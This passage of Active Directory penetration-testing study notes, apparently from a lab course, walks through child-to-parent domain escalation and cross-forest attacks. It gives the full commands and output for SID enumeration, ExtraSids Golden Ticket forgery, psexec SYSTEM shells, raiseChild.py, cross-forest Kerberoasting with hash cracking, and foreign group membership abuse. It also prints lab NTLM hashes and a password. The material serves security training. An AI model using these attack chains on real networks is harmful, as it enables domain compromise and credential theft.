500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)
513: LOGISTICS\Domain Users (SidTypeGroup)
514: LOGISTICS\Domain Guests (SidTypeGroup)
515: LOGISTICS\Domain Computers (SidTypeGroup)
516: LOGISTICS\Domain Controllers (SidTypeGroup)
517: LOGISTICS\Cert Publishers (SidTypeAlias)
520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
525: LOGISTICS\Protected Users (SidTypeGroup)
526: LOGISTICS\Key Admins (SidTypeGroup)
553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
1001: LOGISTICS\lab_adm (SidTypeUser)
1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
1103: LOGISTICS\DnsAdmins (SidTypeAlias)
1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
1106: LOGISTICS\htb-student_adm (SidTypeUser)
```

**Explanation:**
- `lookupsid.py` brute forces SID values at the target DC to enumerate all domain users, groups, and — critically — the **domain SID**.
- The SID for `lab_adm` would be `S-1-5-21-2806153819-209893948-922872689-1001` (domain SID + RID).

### Looking for the Domain SID (Filtered)

```bash
$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Password:
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

### Grabbing the Domain SID and Attaching to Enterprise Admin's RID

```bash
$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

**Explanation:**
- The second command targets the **parent domain DC** (`172.16.5.5`) to retrieve the parent domain SID and identify the Enterprise Admins group RID (`519`).
- Full Enterprise Admins SID: `S-1-5-21-3842939050-3880317879-2865463114-519`.

**Collected data points:**
- KRBTGT hash: `9d765b482771505cbe97411065964d5f`
- Child domain SID: `S-1-5-21-2806153819-209893948-922872689`
- Target user (fake): `hacker`
- Child FQDN: `LOGISTICS.INLANEFREIGHT.LOCAL`
- Enterprise Admins SID: `S-1-5-21-3842939050-3880317879-2865463114-519`

---

## 27.3 Constructing a Golden Ticket using ticketer.py

```bash
$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in hacker.ccache
```

**Explanation:**
- `ticketer.py` from Impacket creates a forged Golden Ticket saved as `hacker.ccache`.
- `-nthash` — child domain KRBTGT NT hash.
- `-domain` — child domain FQDN.
- `-domain-sid` — child domain SID (valid in child domain).
- `-extra-sid` — Enterprise Admins SID from parent domain (grants access to parent domain).
- `hacker` — the username embedded in the ticket (does not need to exist).
- The ticket is saved as a `.ccache` credential cache file.

---

## 27.4 Setting KRB5CCNAME and Getting a SYSTEM Shell via psexec.py

```bash
$ export KRB5CCNAME=hacker.ccache
```

**Explanation:**
- Tells all Kerberos tools to use `hacker.ccache` for authentication.

```bash
$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file nkYjGWDZ.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service eTCU on 172.16.5.5.....
[*] Starting service eTCU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01
```

**Explanation:**
- `-k -no-pass` uses the Kerberos ticket from `KRB5CCNAME` — no password required.
- `-target-ip 172.16.5.5` specifies the parent DC's IP directly.
- `whoami` confirms `nt authority\system` — full SYSTEM shell on the parent domain DC.
- `hostname` confirms we are on `ACADEMY-EA-DC01` — the parent domain's DC.

---

## 27.5 Automated Attack with raiseChild.py

```bash
$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file BnEGssCE.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service UVNb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Stopping service UVNb.....
[*] Removing service UVNb.....
[*] Removing file BnEGssCE.exe.....
```

**Explanation:**
- `raiseChild.py` automates the entire child→parent domain escalation in one command.
- The script's internal workflow (from the source comments):
  1. Locates the child domain controller via MS-NRPC
  2. Finds the forest FQDN via MS-NRPC
  3. Gets the forest's Enterprise Admin SID via MS-LSAT
  4. Gets the child domain's KRBTGT credentials via MS-DRSR (DCSync)
  5. Creates a Golden Ticket with the Enterprise Admin SID in the `ExtraSids` array, valid for 10 years
  6. Logs into the parent forest and retrieves the target user's credentials (Administrator by default)
  7. If `-w` specified, saves the Golden Ticket as a `.ccache` file
  8. If `-target-exec` specified, launches a PSExec shell with Enterprise Admin privileges
- **Opsec warning:** Use `raiseChild.py` carefully in production environments. Always understand the manual process first so you can troubleshoot if the tool fails. Avoid "autopwn" scripts that you cannot fully control — if something breaks, you need to be able to explain what happened to the client.

> **"We don't want to tell the client that something broke because we used an 'autopwn' script!"**

---

# 28. Attacking Domain Trusts — Cross-Forest (Windows)

## 28.1 Introduction

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed **across trusts**, depending on the trust direction. When positioned in a domain with an inbound or bidirectional domain/forest trust, various attacks can be leveraged to gain a foothold. Sometimes we cannot escalate privileges in our current domain, but can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

---

## 28.2 Cross-Forest Kerberoasting

### Enumerating Accounts for Associated SPNs Using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

**Explanation:**
- `-SPN` filters for accounts with a Service Principal Name set — candidates for Kerberoasting.
- `-Domain FREIGHTLOGISTICS.LOCAL` targets the trusted external forest.
- One account (`mssqlsvc`) has an SPN — worth investigating further.

---

### Enumerating the mssqlsvc Account

```powershell
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

**Explanation:**
- `mssqlsvc` is a member of **Domain Admins** in `FREIGHTLOGISTICS.LOCAL`.
- If we Kerberoast this account and crack the hash offline, we would have full admin rights to the entire target forest — a high-value target.

---

### Performing a Kerberoasting Attack with Rubeus Using /domain Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
```

**Explanation:**
- `/domain:FREIGHTLOGISTICS.LOCAL` directs Rubeus to request the TGS ticket from the external forest's DC.
- `/user:mssqlsvc` targets only this specific account.
- `/nowrap` prevents line wrapping for easy Hashcat input.
- The `$krb5tgs$23$...` hash can be cracked offline with Hashcat mode 13100.
- If cracked, we gain **full Domain Admin access** to `FREIGHTLOGISTICS.LOCAL` by leveraging a bidirectional forest trust and a standard Kerberoasting attack.

---

## 28.3 Admin Password Re-Use and Foreign Group Membership

### Admin Password Re-Use

In a bidirectional forest trust managed by admins from the same company, if we take over Domain A and obtain cleartext passwords or NT hashes for a highly privileged account, it is worth checking for **password re-use** across the trust. For example:
- Domain A has `adm_bob.smith` in Domain Admins
- Domain B has `bsmith_admin` — same password

Owning Domain A could instantly give full admin rights to Domain B. Always check for password re-use across similarly named accounts in different domains and report any findings.

### Foreign Group Membership

Only **Domain Local Groups** allow security principals from outside a forest. It is not uncommon to see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust. Taking over that admin user in Domain A grants full administrative access to Domain B based on group membership alone.

### Using Get-DomainForeignGroupMember

```powershell
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGISTICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

**Explanation:**
- `Get-DomainForeignGroupMember` enumerates all groups in the target domain that contain members from **outside the domain** (foreign group membership).
- The output shows the built-in **Administrators** group in `FREIGHTLOGISTICS.LOCAL` contains a member with SID `S-1-5-21-3842939050-3880317879-2865463114-500`.
- `Convert-SidToName` resolves that SID to `INLANEFREIGHT\administrator` — the built-in Administrator of `INLANEFREIGHT.LOCAL` is a member of the Administrators group in the external forest.
- This means controlling `INLANEFREIGHT\administrator` grants full admin access to `FREIGHTLOGISTICS.LOCAL`.

---

### Accessing DC03 Using Enter-PSSession

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```

**Explanation:**
- `Enter-PSSession` uses the `INLANEFREIGHT\administrator` credential to authenticate to the DC in the `FREIGHTLOGISTICS.LOCAL` domain across the bidirectional forest trust.
- `whoami` confirms `inlanefreight\administrator` — authenticated as the INLANEFREIGHT admin.
- `ipconfig /all` confirms we are on `ACADEMY-EA-DC03` in the `FREIGHTLOGISTICS.LOCAL` domain.
- This is a **quick win** after taking control of a domain — always check for foreign group membership when a bidirectional forest trust is present and the second forest is in scope.

---

## 28.4 SID History Abuse — Cross Forest

SID History can also be abused **across a forest trust** if SID Filtering is not enabled. If a user migrated from Forest A to Forest B has the SID of a privileged account in Forest A added to their `sidHistory`, that SID is added to their token when authenticating across the trust — granting those privileges in the partner forest. For example, if `jjones` is migrated from `INLANEFREIGHT.LOCAL` to `CORP.LOCAL` and had admin rights in `INLANEFREIGHT.LOCAL`, those rights are retained in `INLANEFREIGHT.LOCAL` even after migration, if SID filtering is not enforced. This attack is a powerful persistence mechanism, especially in M&A scenarios where two forests are merged without proper security review.

> This attack will be covered in-depth in a later module focusing more heavily on attacking AD trusts.

---

# 29. Attacking Domain Trusts — Cross-Forest (Linux)

As seen in the previous section, it is often possible to Kerberoast across a forest trust. We can perform this from a Linux host using `GetUserSPNs.py`. We need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag.

---

## 29.1 Cross-Forest Kerberoasting with GetUserSPNs.py

### Using GetUserSPNs.py (Enumerate SPNs)

```bash
$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>
```

**Explanation:**
- `-target-domain FREIGHTLOGISTICS.LOCAL` specifies the trusted external forest to enumerate.
- `INLANEFREIGHT.LOCAL/wley` provides credentials from our current domain.
- The output confirms `mssqlsvc` has an SPN and is a member of **Domain Admins** in `FREIGHTLOGISTICS.LOCAL` — a prime Kerberoasting target.

---

### Using the -request Flag (Retrieve the Hash)

```bash
$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>


$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```

**Explanation:**
- `-request` fetches the actual TGS ticket hash for offline cracking.
- `-outputfile <FILE>` can be added to save the hash directly to a file for Hashcat.
- Crack with Hashcat mode 13100: `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt`.
- If cracked, we can authenticate into `FREIGHTLOGISTICS.LOCAL` as a Domain Admin.

> **Post-crack steps:** After cracking the hash, check if the account exists in the current domain with the same name and suffers from **password re-use** — a quick win if not yet escalated in the current domain. Even if already in control of the current domain, add a finding to the report if password re-use is confirmed across domains. Also consider a **password spray** with the cracked password against other service accounts in case the same admins manage both domains. This is iterative testing — leave no stone unturned.

---

## 29.2 Hunting Foreign Group Membership with BloodHound-Python

From a Linux host, we can gather foreign group membership data using the Python implementation of BloodHound across multiple domains, ingest it into the GUI, and search for cross-forest relationships.

On some assessments a client-provisioned VM will already have DNS configured. In other cases the attack host has no DNS configured and we must edit `/etc/resolv.conf` manually, since bloodhound-python requires DNS hostnames for Domain Controllers (not just IPs).

---

### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf

```bash
$ cat /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

**Explanation:**
- Comment out the existing `nameserver` entries and add the target domain name and DC IP.
- `domain INLANEFREIGHT.LOCAL` sets the default domain for DNS lookups.
- `nameserver 172.16.5.5` points to the INLANEFREIGHT Domain Controller for name resolution.

---

### Running bloodhound-python Against INLANEFREIGHT.LOCAL

```bash
$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts

<SNIP>
```

**Explanation:**
- `-d INLANEFREIGHT.LOCAL` — target domain.
- `-dc ACADEMY-EA-DC01` — Domain Controller hostname (requires DNS resolution).
- `-c All` — collect all data types: users, groups, computers, GPOs, trusts, sessions, ACLs.
- Output shows 559 computers, 2950 users, 183 groups, and 2 trusts discovered.

---

### Compressing the File with zip -r

```bash
$ zip -r ilfreight_bh.zip *.json

  adding: 20220329140127_computers.json (deflated 99%)
  adding: 20220329140127_domains.json (deflated 82%)
  adding: 20220329140127_groups.json (deflated 97%)
  adding: 20220329140127_users.json (deflated 98%)
```

**Explanation:**
- Compresses all four JSON output files (computers, domains, groups, users) into a single zip for uploading to the BloodHound GUI.

---

### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf

```bash
$ cat /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

**Explanation:**
- Update `/etc/resolv.conf` again, this time pointing to the `FREIGHTLOGISTICS.LOCAL` domain and its DC (`172.16.5.238`) for the second data collection run.

---

### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL

```bash
$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
```

**Explanation:**
- `-dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL` — specifies the FQDN of the external forest's DC.
- `-u forend@inlanefreight.local` — authenticate using the full UPN format (domain\user or user@domain) to cross into the external forest with our current domain credentials.
- The external forest has 5 computers, 9 users, 52 groups, and 1 trust — a much smaller environment.
- Zip this second batch of JSON files and upload to BloodHound alongside the first batch.

---

### Viewing Dangerous Rights through BloodHound

After uploading both sets of data into the BloodHound GUI:
1. Click the **Analysis** tab.
2. Select **Users with Foreign Domain Group Membership**.
3. Set the source domain to `INLANEFREIGHT.LOCAL`.
4. The result shows `ADMINISTRATOR@INLANEFREIGHT.LOCAL` is a member of `ADMINISTRATORS@FREIGHTLOGISTICS.LOCAL` — confirming the foreign group membership found manually with PowerView in the previous section.

This is a significant finding: any attacker who compromises `INLANEFREIGHT\administrator` gains full admin access to `FREIGHTLOGISTICS.LOCAL` by virtue of group membership across the bidirectional forest trust.

---

## 29.3 Closing Thoughts on Domain Trusts

As seen across the trust attack sections, there are several ways to leverage domain trusts to gain additional access and perform "end-around" privilege escalation:

- **Take over a trusted domain** and find password re-use across privileged accounts.
- **Child domain compromise** almost always leads to parent domain compromise via the ExtraSids / Golden Ticket attack.
- **Cross-forest Kerberoasting** can yield Domain Admin credentials in a trusted forest.
- **Foreign group membership** can give instant admin access to a trusted forest without any exploitation.
- **SID History abuse** can provide persistent access across forest boundaries when SID filtering is not enforced.

Domain trusts are a large and complex topic. The techniques in this module provide foundational tools for enumerating trusts and performing standard intra-forest and cross-forest attacks. More advanced trust attacks will be covered in-depth in dedicated later modules.

---

*End of Active Directory Security Notes*

---

> **Study Tip:** The attack chains in this module follow a logical progression: ACL enumeration → ACL abuse → DCSync → privileged access → trust attacks. Understanding each step and its dependencies is key to applying these techniques during real assessments.

